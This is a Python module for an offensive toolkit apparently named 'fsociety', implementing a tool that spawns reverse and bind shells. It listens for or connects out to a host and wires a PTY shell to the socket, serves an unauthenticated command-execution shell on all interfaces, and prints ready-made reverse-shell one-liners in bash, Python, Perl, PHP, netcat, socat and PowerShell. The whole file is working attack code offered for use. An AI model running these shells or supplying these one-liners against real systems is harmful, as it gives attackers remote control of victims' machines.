from __future__ import annotations

import os
import pty
import select
import socket
import subprocess
import sys
import termios
import time
import tty
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log
from fsociety.core.utils import random_name

@tool("shellx", "Reverse/bind shell handler and local shell spawner", category="shell")
class Shellx:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        listen = sub.add_parser("listen", help="start a TCP listener and hand off to /bin/sh")
        listen.add_argument("--host", default="0.0.0.0")
        listen.add_argument("--port", type=int, required=True)
        listen.add_argument("--shell", default="/bin/sh")
        listen.add_argument("--timeout", type=float, default=0.0)
        listen.add_argument("--once", action="store_true", help="serve one session and exit")

        connect = sub.add_parser("connect", help="attach to a reverse shell listener")
        connect.add_argument("--host", required=True)
        connect.add_argument("--port", type=int, required=True)
        connect.add_argument("--shell", default="/bin/sh")

        serve = sub.add_parser("serve", help="bind a shell to a TCP port")
        serve.add_argument("--host", default="0.0.0.0")
        serve.add_argument("--port", type=int, required=True)
        serve.add_argument("--shell", default="/bin/sh")

        gen = sub.add_parser("gen", help="emit a one-liner loader")
        gen.add_argument("--host", required=True)
        gen.add_argument("--port", type=int, required=True)
        gen.add_argument("--lang", default="bash",
                         choices=["bash", "python", "python3", "perl", "php",
                                  "nc", "socat", "powershell"])

    @staticmethod
    def _pty_loop(sock: socket.socket, shell: str, timeout: float) -> None:
        pid, fd = pty.fork()
        if pid == 0:
            os.execv(shell, [shell])
        try:
            while True:
                rlist = [fd, sock]
                if timeout:
                    rlist = [fd, sock]
                ready, _, _ = select.select(rlist, [], [], timeout or None)
                if not ready:
                    break
                if fd in ready:
                    try:
                        data = os.read(fd, 4096)
                    except OSError:
                        break
                    if not data:
                        break
                    sock.sendall(data)
                if sock in ready:
                    try:
                        data = sock.recv(4096)
                    except OSError:
                        break
                    if not data:
                        break
                    os.write(fd, data)
        except KeyboardInterrupt:
            pass
        finally:
            try:
                os.close(fd)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass

    @staticmethod
    def _listen(host: str, port: int, shell: str, timeout: float, once: bool) -> int:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(1)
        srv.settimeout(timeout or None)
        try:
            while True:
                try:
                    client, addr = srv.accept()
                except socket.timeout:
                    return 1
                Shellx._pty_loop(client, shell, timeout)
                if once:
                    break
        finally:
            srv.close()
        return 0

    @staticmethod
    def _connect(host: str, port: int, shell: str) -> int:
        sock = socket.create_connection((host, port), timeout=15)
        Shellx._pty_loop(sock, shell, 0.0)
        return 0

    @staticmethod
    def _serve(host: str, port: int, shell: str) -> int:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(1)
        try:
            client, _ = srv.accept()
        finally:
            srv.close()
        while True:
            try:
                data = client.recv(4096)
                if not data:
                    break
                proc = subprocess.run(data.decode("utf-8", "ignore"),
                                      shell=True, capture_output=True, timeout=30)
                client.sendall(proc.stdout + proc.stderr)
            except (socket.timeout, subprocess.SubprocessError, OSError):
                break
        client.close()
        return 0

    @staticmethod
    def _gen(host: str, port: int, lang: str) -> str:
        return {
            "bash":       f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            "python":     f"python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            "python3":    f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            "perl":       f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            "php":        f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc":         f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
            "socat":      f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}",
            "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        }[lang]

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "listen":
            log.info(f"listening on {args.host}:{args.port}")
            return Shellx._listen(args.host, args.port, args.shell, args.timeout, args.once)
        if args.cmd == "connect":
            log.info(f"connecting to {args.host}:{args.port}")
            return Shellx._connect(args.host, args.port, args.shell)
        if args.cmd == "serve":
            log.info(f"serving shell on {args.host}:{args.port}")
            return Shellx._serve(args.host, args.port, args.shell)
        if args.cmd == "gen":
            print(Shellx._gen(args.host, args.port, args.lang))
            return 0
        return 2
